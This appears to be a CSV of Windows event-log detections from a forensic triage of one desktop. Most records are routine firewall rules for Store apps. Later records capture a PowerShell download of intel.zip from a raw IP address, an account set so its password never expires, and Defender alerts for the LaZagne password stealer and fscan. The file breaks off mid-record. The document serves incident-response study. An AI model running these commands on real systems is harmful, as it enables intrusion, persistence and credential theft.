+2024-02-28T05:01:18.157104+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,703,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{E12BD3B0-99F5-43FB-91DB-C42F01EF7102}'
+RuleName: '@{Microsoft.ZuneMusic_11.2401.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneMusic/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:02:59.282273+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,715,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{7F0130D4-D18F-4737-8A0E-F6C2CD96F6F2}'
+RuleName: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:02:59.283494+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,716,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{90D9AFFF-9769-4660-84A4-C305F151A38B}'
+RuleName: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:02:59.284492+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,717,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{155806D4-8590-4854-8487-A0CCF157CA3F}'
+RuleName: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T05:02:59.285550+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,718,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{B9CE6915-9234-452D-B575-99006FAE130C}'
+RuleName: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T05:02:59.286260+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,719,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{B71365EE-B561-441B-A318-961921AFB7EB}'
+RuleName: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:02:59.287131+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,720,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{7AABC539-DFA8-49B5-8954-89CD29F722E1}'
+RuleName: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:02:59.287862+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,721,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{276576E3-7AC5-4D67-86AE-76B3755D0D48}'
+RuleName: '@{Microsoft.ZuneVideo_10.22091.10061.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.ZuneVideo/resources/IDS_MANIFEST_VIDEO_APP_NAME}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:04:19.959656+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,728,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.Microsoft3DViewer_7.2401.29012.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Microsoft3DViewer/Common.View.UWP/Resources/StoreAppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{138DEB0C-1861-43C3-9802-88061FDF8E7A}'
+RuleName: '@{Microsoft.Microsoft3DViewer_7.2401.29012.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Microsoft3DViewer/Common.View.UWP/Resources/StoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:04:19.961247+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,729,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.Microsoft3DViewer_7.2401.29012.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Microsoft3DViewer/Common.View.UWP/Resources/StoreAppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{F7F1D18D-5E35-47E4-84EF-CC6BAF1F93AA}'
+RuleName: '@{Microsoft.Microsoft3DViewer_7.2401.29012.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.Microsoft3DViewer/Common.View.UWP/Resources/StoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:05:42.876111+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,750,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{37ABBC44-D882-46EB-B976-A2602383D028}'
+RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:05:42.877072+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,751,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{59BF09FC-7577-4DE5-A32A-8650E19C00E6}'
+RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:05:42.878034+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,752,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{9E62D768-B892-4636-8021-66B72D4377CD}'
+RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T05:05:42.879161+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,753,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{3ACFFA41-09AE-4F90-BCCF-E6AEF8E313E7}'
+RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T05:05:42.880254+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,754,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{9A2EF20F-A374-4586-87D4-24A289CFACB7}'
+RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:05:42.881217+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,755,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{793242E4-BB6F-4B76-B521-825803D7A111}'
+RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:05:42.882655+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,756,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{B8B0763D-40D2-4B85-BCBF-2EB8626763C1}'
+RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T05:05:42.883852+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,757,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 1
+EmbeddedContext: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+Flags: 9
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{F5DE8750-D3EA-4105-B373-2876E15FD69B}'
+RuleName: '@{microsoft.windowscommunicationsapps_16005.14326.21830.0_x64__8wekyb3d8bbwe?ms-resource://microsoft.windowscommunicationsapps/hxoutlookintl/AppManifest_OutlookDesktop_DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T09:20:47.860805+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,22249,DESKTOP-A1L0P1U,"CommandLine: C:\Users\TOMMYX~1\AppData\Local\Temp\F6F9D7CF-8182-4586-907D-213BBD4436BC\dismhost.exe {2F341D33-4983-4365-AACC-C908F9B03FFF}
+MandatoryLabel: S-1-16-12288
+NewProcessId: '0x1184'
+NewProcessName: C:\Users\TOMMYX~1\AppData\Local\Temp\F6F9D7CF-8182-4586-907D-213BBD4436BC\DismHost.exe
+ParentProcessName: C:\Windows\System32\cleanmgr.exe
+ProcessId: '0x814'
+SubjectDomainName: DESKTOP-A1L0P1U
+SubjectLogonId: '0x484c8'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1937'
+",
+2024-03-05T12:38:51.253218+00:00,Powershell LocalAccount Manipulation,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,101,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: e6516c78-dc94-4088-a8d9-052b913fd3e0
+ScriptBlockText: Set-LocalUser -Name Guess -PasswordNeverExpires $true
+",
+2024-03-05T12:39:32.799578+00:00,Usage Of Web Request Commands And Cmdlets - ScriptBlock,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx,1,Microsoft-Windows-PowerShell,4104,128,DESKTOP-A1L0P1U,"MessageNumber: 1
+MessageTotal: 1
+Path: ''
+ScriptBlockId: 12e16f4b-0c2e-4831-9594-56347efd339f
+ScriptBlockText: Invoke-WebRequest -URI ""http://13.53.200.146/intel.zip"" -OutFile ""./intel.zip""
+",
+2024-03-05T12:42:06.298207+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,188,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '34'
+Category Name: Tool
+Detection ID: '{A359BA71-65A5-4032-A845-95D86D1965CE}'
+Detection Time: 2024-03-05T12:42:05.984Z
+Detection User: ''
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/LaZagne&threatid=2147725068&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\browser-pw-decrypt.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: Unknown
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '4'
+Severity Name: High
+Source ID: '3'
+Source Name: Real-Time Protection
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147725068'
+Threat Name: HackTool:Win32/LaZagne
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:42:07.033711+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,190,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '8'
+Category Name: Trojan
+Detection ID: '{BA1C6BB3-E5E6-41F6-8EAA-469238E2748F}'
+Detection Time: 2024-03-05T12:42:06.432Z
+Detection User: ''
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '1'
+Execution Name: Suspended
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/CryptInject&threatid=2147725859&enterprise=0
+Origin ID: '1'
+Origin Name: Local machine
+Path: file:_C:\Users\tommyxiaomi\Documents\fscan64.exe
+Post Clean Status: '0'
+Pre Execution Status: '0'
